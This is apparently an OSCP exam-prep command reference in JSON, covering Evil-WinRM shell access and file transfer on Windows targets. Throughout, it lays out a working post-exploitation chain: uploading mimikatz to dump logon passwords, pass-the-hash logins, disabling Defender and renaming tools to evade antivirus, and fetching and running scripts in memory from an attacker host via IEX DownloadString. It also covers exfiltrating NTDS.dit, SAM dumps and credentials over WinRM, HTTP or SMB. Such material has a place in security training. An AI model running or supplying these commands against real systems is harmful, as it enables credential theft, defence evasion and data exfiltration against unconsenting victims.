{
  "metadata": {
    "file_purpose": "Evil-WinRM file upload and download commands for tool deployment and data exfiltration in Windows environments",
    "oscp_relevance": "HIGH - File transfer is essential for deploying exploit tools (mimikatz, winPEAS, Rubeus) and exfiltrating data (credentials, flags, loot) during OSCP exam",
    "educational_context": "Evil-WinRM provides built-in file transfer capabilities using PowerShell remoting. Upload uses 'upload' command (local→remote), download uses 'download' command (remote→local). Transfers occur over WinRM (HTTP/HTTPS on ports 5985/5986), bypassing traditional file share restrictions. Advantages over SMB: (1) Works when SMB blocked, (2) No network share setup needed, (3) Encrypted with HTTPS, (4) Integrated into existing WinRM session.",
    "prerequisites": [
      "Active Evil-WinRM session (evil-winrm -i <IP> -u <USER> -p <PASS>)",
      "Valid credentials with WinRM access (local admin OR PSRemote group)",
      "WinRM enabled on target (default Windows 10+ / Server 2012+)",
      "Network access to ports 5985 (HTTP) or 5986 (HTTPS)"
    ],
    "related_techniques": [
      "Evil-WinRM connection (evil-winrm-creds, evil-winrm-hash)",
      "Mimikatz credential dumping (mimikatz-sekurlsa-logonpasswords)",
      "PowerShell file transfer (certutil, Invoke-WebRequest)",
      "SMB file transfer (smbclient, copy to shares)"
    ],
    "attack_chain": [
      "1. Establish Evil-WinRM session to target",
      "2. Upload attack tools: upload /path/to/mimikatz.exe",
      "3. Execute tools on target: .\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' > creds.txt",
      "4. Download results: download creds.txt",
      "5. Parse locally and use harvested credentials for lateral movement"
    ],
    "file_transfer_alternatives": [
      "Certutil: certutil -urlcache -split -f http://<LHOST>/file.exe file.exe",
      "PowerShell IWR: (New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\\temp\\file.exe')",
      "SMB: smbclient //<IP>/C$ -U <USER> -c 'put file.exe'",
      "Impacket smbserver: smbserver.py share . -smb2support, then: copy \\\\<LHOST>\\share\\file.exe C:\\temp\\",
      "Base64 encoding: For small files, encode on Kali and decode on Windows"
    ]
  },
  "commands": [
    {
      "id": "evil-winrm",
      "name": "Evil-WinRM Remote Shell",
      "category": "exploitation",
      "subcategory": "lateral-movement",
      "command": "evil-winrm -i <TARGET> -u <USER> -p '<PASS>'",
      "example": "evil-winrm -i 192.168.50.70 -u Administrator -p 'Password123!'",
      "description": "Establish interactive PowerShell shell over WinRM (port 5985/5986)",
      "tags": ["EVIL_WINRM", "WINRM", "LATERAL_MOVEMENT", "OSCP:HIGH"],
      "variables": [
        {"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.70", "required": true},
        {"name": "<USER>", "description": "Username", "example": "Administrator", "required": true},
        {"name": "<PASS>", "description": "Password", "example": "Password123!", "required": true}
      ],
      "flag_explanations": {
        "-i": "Target IP or hostname",
        "-u": "Username",
        "-p": "Password (quote if special chars)",
        "-H": "NTLM hash instead of password",
        "-S": "Use HTTPS (port 5986)"
      },
      "success_indicators": ["Evil-WinRM shell", "PS >"],
      "failure_indicators": ["WinRM service is not running", "Access Denied"],
      "notes": "Requires WinRM enabled (default on modern Windows). Use -H for pass-the-hash. Built-in upload/download commands for file transfer.",
      "oscp_relevance": "high"
    },
    {
      "id": "evil-winrm-upload-file",
      "name": "Evil-WinRM Upload File to Target",
      "category": "exploitation",
      "subcategory": "file-transfer",
      "command": "upload <LOCAL_FILE>",
      "description": "Upload file from local Kali machine to remote Windows target through Evil-WinRM session. Deploys tools (mimikatz, Rubeus, winPEAS) or payloads (shells, exploits) for execution. Default destination: Current working directory on remote system.",
      "variables": [
        {
          "name": "<LOCAL_FILE>",
          "description": "Path to file on local Kali system. Can be absolute or relative path. Common files: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe, /opt/winPEAS/winPEASx64.exe, /home/kali/tools/Rubeus.exe",
          "example": "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "upload command": "Evil-WinRM built-in command for file uploads. Syntax: 'upload <local_file> [remote_file]'. If remote_file not specified, uploads to current directory with same filename. Example: 'upload /usr/share/mimikatz/x64/mimikatz.exe mimikatz.exe'. WHY BUILT-IN: No need for web server, SMB server, or network shares. Uses PowerShell remoting for transfer.",
        "Default destination": "Files upload to current working directory on remote system. Check with 'pwd' before uploading. Change with 'cd C:\\temp' or similar. WHY IMPORTANT: Some directories (C:\\Windows, C:\\Program Files) are write-protected even for admins. OSCP TIP: Use C:\\temp, C:\\Users\\<USER>\\AppData\\Local\\Temp, or C:\\ProgramData (writable by default).",
        "Optional remote filename": "Specify destination filename: 'upload /local/file.exe custom_name.exe'. WHY: (1) Rename to avoid AV signatures (mimikatz.exe → mm.exe), (2) Avoid filename conflicts, (3) Use descriptive names for organization. Example: upload /opt/winPEAS/winPEASx64.exe wp.exe",
        "Upload with path": "Specify full remote path: 'upload /local/file.exe C:\\temp\\file.exe'. WHY: Control exact destination without changing directory. Useful for scripts uploading multiple files to different locations."
      },
      "success_indicators": [
        "Output: 'Info: Uploading <LOCAL_FILE> to <REMOTE_PATH>'",
        "Output: 'Data: <SIZE> bytes of <SIZE> bytes copied'",
        "Output: 'Info: Upload successful!'",
        "Verify with: ls or dir on remote system shows uploaded file",
        "Check size: (Get-Item .\\file.exe).Length matches local file size"
      ],
      "failure_indicators": [
        "Error: 'Cannot find path' - local file doesn't exist",
        "Error: 'Access denied' - no write permissions on remote directory",
        "Error: 'The connection has been closed' - WinRM session dropped",
        "Upload hangs indefinitely - firewall blocking, large file timeout",
        "File size 0 bytes on remote - incomplete transfer"
      ],
      "troubleshooting": {
        "Local file not found": "Error: 'Cannot find path <LOCAL_FILE>'. Solution: Verify file exists: ls -la /path/to/file. Use tab completion in Evil-WinRM prompt for file paths. Check case sensitivity on Linux (mimikatz.exe vs Mimikatz.exe). If using relative path, verify current directory: pwd",
        "Access denied on remote": "Error: 'Access to the path C:\\... is denied'. Causes: (1) No write permissions in directory, (2) AV blocked write, (3) AppLocker policy. Solution: Change directory: cd C:\\temp or cd C:\\Users\\Public. Check writable directories: Get-Acl C:\\temp | Format-List. Alternative: Upload to user's home: cd $env:USERPROFILE\\Documents",
        "WinRM session timeout": "Upload hangs or 'connection closed' error. Causes: (1) Large file timeout (default 60 seconds), (2) Network instability, (3) Firewall dropping long connections. Solution: For large files (>10MB), use chunked transfer or alternative methods. Alternative: certutil -urlcache -f http://<LHOST>/file.exe file.exe (start Python HTTP server on Kali)",
        "AV detection during upload": "File deleted immediately after upload or upload blocked. Solution: (1) Check AV: Get-MpPreference, (2) Disable Defender: Set-MpPreference -DisableRealtimeMonitoring $true (admin required), (3) Use obfuscated/packed binary, (4) Rename file (mm.exe instead of mimikatz.exe), (5) Upload to excluded location: C:\\Windows\\Tasks\\, (6) Use in-memory execution: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')"
      },
      "notes": "OSCP METHODOLOGY: File upload is MANDATORY for deploying tools on target systems. Evil-WinRM upload is preferred over HTTP transfer because: (1) No web server setup needed, (2) Works over WinRM (already established), (3) Simpler syntax than certutil/PowerShell.\n\nTIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)\n\nFILE SIZE LIMITS:\n- Small files (<5MB): Fast, no issues (mimikatz.exe ~1.2MB, winPEAS ~2MB)\n- Medium files (5-20MB): May timeout on slow connections\n- Large files (>20MB): Use alternative transfer methods (SMB, chunked HTTP)\n\nCOMMON FILES TO UPLOAD:\n1. Mimikatz: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe\n2. winPEAS: /opt/winPEAS/winPEASx64.exe (enumeration)\n3. Rubeus: /opt/Rubeus/Rubeus.exe (Kerberos attacks)\n4. SharpHound: /opt/BloodHound/Collectors/SharpHound.exe (AD enumeration)\n5. nc.exe: /usr/share/windows-binaries/nc.exe (reverse shells)\n6. PowerUp.ps1: /opt/PowerSploit/Privesc/PowerUp.ps1 (Windows privesc)\n\nOPTIMIZATION:\n- Navigate to writable directory BEFORE uploading: cd C:\\temp\n- Rename suspicious tools: upload /path/mimikatz.exe mm.exe\n- Verify upload success: ls; (Get-Item .\\mm.exe).Length\n\nEXAM TIP: Pre-stage common tools in organized directory on Kali (/opt/oscp-tools/) for fast access. Document full paths in cheat sheet.",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "EVIL_WINRM",
        "FILE_TRANSFER",
        "FILE_UPLOAD",
        "TOOL_DEPLOYMENT",
        "MIMIKATZ_UPLOAD",
        "WINDOWS",
        "LATERAL_MOVEMENT",
        "POST_EXPLOITATION"
      ],
      "prerequisites": [
        "evil-winrm-shell"
      ],
      "alternatives": [
        "certutil-download",
        "file-transfer-powershell-download",
        "smbclient-connect"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords",
        "sharphound-collect"
      ]
    },
    {
      "id": "evil-winrm-download-file",
      "name": "Evil-WinRM Download File from Target",
      "category": "exploitation",
      "subcategory": "file-transfer",
      "command": "download <REMOTE_FILE>",
      "description": "Download file from remote Windows target to local Kali machine through Evil-WinRM session. Exfiltrate credentials, mimikatz output, BloodHound data, flags, or loot. Default destination: Current directory on local Kali system.",
      "variables": [
        {
          "name": "<REMOTE_FILE>",
          "description": "Path to file on remote Windows system. Can be absolute (C:\\temp\\creds.txt) or relative (.\\creds.txt). Common targets: flags (C:\\Users\\Administrator\\Desktop\\flag.txt), mimikatz output, BloodHound ZIPs, SAM/SYSTEM dumps.",
          "example": "C:\\temp\\creds.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "download command": "Evil-WinRM built-in command for file downloads. Syntax: 'download <remote_file> [local_file]'. If local_file not specified, downloads to current directory on Kali with same filename. Example: 'download C:\\temp\\creds.txt loot/creds.txt'. WHY BUILT-IN: No need for network shares or exfil servers. Uses PowerShell remoting for transfer.",
        "Default destination": "Files download to current directory on local Kali. Check with 'pwd' (on Kali, not in Evil-WinRM prompt). Change local directory by exiting Evil-WinRM, navigating to desired folder, then reconnecting. OSCP TIP: Organize loot by target: mkdir /home/kali/exam/<TARGET_IP>/loot before connecting.",
        "Optional local filename": "Specify local destination: 'download C:\\temp\\file.txt custom_name.txt' or 'download C:\\temp\\file.txt /home/kali/loot/file.txt'. WHY: (1) Organize loot (download flag.txt /home/kali/exam/target1/flag.txt), (2) Avoid filename conflicts when attacking multiple targets, (3) Descriptive naming (download creds.txt 192.168.50.75-mimikatz-output.txt)."
      },
      "success_indicators": [
        "Output: 'Info: Downloading <REMOTE_FILE> to <LOCAL_PATH>'",
        "Output: 'Info: Download successful!'",
        "Verify on Kali: ls -lh shows downloaded file with correct size",
        "Check integrity: md5sum <file> (compare with remote: Get-FileHash -Algorithm MD5 <file>)"
      ],
      "failure_indicators": [
        "Error: 'Cannot find path' - remote file doesn't exist",
        "Error: 'Access denied' - no read permissions on remote file",
        "Error: 'The connection has been closed' - WinRM session dropped",
        "Download hangs indefinitely - firewall, large file timeout",
        "Local file size 0 bytes - incomplete transfer"
      ],
      "troubleshooting": {
        "Remote file not found": "Error: 'Cannot find path C:\\...'. Solution: Verify file exists on remote: ls C:\\temp or Test-Path C:\\temp\\file.txt. Check spelling and path (Windows paths case-insensitive but path separators matter). Use tab completion in Evil-WinRM for remote paths. Check current directory: pwd",
        "Access denied on remote": "Error: 'Access to the path is denied'. Causes: (1) No read permissions, (2) File locked by another process, (3) Protected system file. Solution: Check permissions: Get-Acl <file> | Format-List. If locked: Stop-Process -Name <PROCESS> -Force (e.g., mimikatz locking logonpasswords.txt). Alternative: Copy to readable location: copy C:\\Windows\\System32\\file.txt C:\\temp\\file.txt",
        "Download timeout": "Large files (>50MB) may timeout. Solution: For large files (BloodHound archives, NTDS.dit, memory dumps), use alternative transfer: (1) SMB: net use Z: \\\\<KALI_IP>\\share /user:<USER> <PASS>, copy file.txt Z:\\, (2) HTTP: python3 -m http.server 80 on Kali, certutil -urlcache -f http://<KALI_IP>/file.txt on Windows, (3) Split files: Compress-Archive, split into chunks, download separately.",
        "Local write permission error": "Error writing to local destination. Solution: Check Kali permissions: ls -ld /path/to/destination. Use absolute path with write permissions: download C:\\file.txt /tmp/file.txt. Verify disk space: df -h"
      },
      "notes": "OSCP METHODOLOGY: Download ALL valuable data immediately after capture: flags, credentials, enumeration output, screenshots of successful exploits. Don't rely on maintaining access - download and document immediately.\n\nTIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)\n\nCOMMON FILES TO DOWNLOAD:\n1. Flags: C:\\Users\\Administrator\\Desktop\\flag.txt, C:\\Users\\<USER>\\Desktop\\flag.txt\n2. Mimikatz output: creds.txt, logonpasswords.txt\n3. BloodHound data: bh.zip, *_BloodHound.zip\n4. SAM/SYSTEM dumps: sam.save, system.save\n5. NTDS.dit: ntds.dit (Domain Controller)\n6. Configuration files: C:\\inetpub\\wwwroot\\web.config, C:\\Windows\\Panther\\Unattend.xml\n7. Enumeration output: winPEAS.txt, PowerUp.txt\n\nBEST PRACTICES:\n- Verify before downloading: ls <file>; (Get-Item <file>).Length\n- Organize locally: mkdir /home/kali/exam/<TARGET_IP>/loot\n- Document in notes: Timestamp, source path, what it contains\n- Check integrity: Get-FileHash -Algorithm MD5 <file> (remote) vs md5sum <file> (local)\n- Clean up remote files after download: del <file> (OpSec)\n\nFLAG RETRIEVAL WORKFLOW:\n1. type C:\\Users\\Administrator\\Desktop\\flag.txt (verify content)\n2. download C:\\Users\\Administrator\\Desktop\\flag.txt /home/kali/exam/target1/root-flag.txt\n3. cat /home/kali/exam/target1/root-flag.txt (verify locally)\n4. Submit flag\n5. Screenshot for report\n\nEXAM TIP: ALWAYS download flags AND important loot immediately. Don't wait until end of exam - machines may become unstable, connections may drop, or you may run out of time.",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "EVIL_WINRM",
        "FILE_TRANSFER",
        "FILE_DOWNLOAD",
        "DATA_EXFILTRATION",
        "FLAG_RETRIEVAL",
        "LOOT",
        "WINDOWS",
        "POST_EXPLOITATION"
      ],
      "prerequisites": [
        "evil-winrm-shell"
      ],
      "alternatives": [
        "smbclient-connect",
        "nc-file-transfer"
      ],
      "next_steps": [
        "bloodhound-upload-data",
        "hashcat-crack",
        "capture-root-flag"
      ]
    }
  ]
}
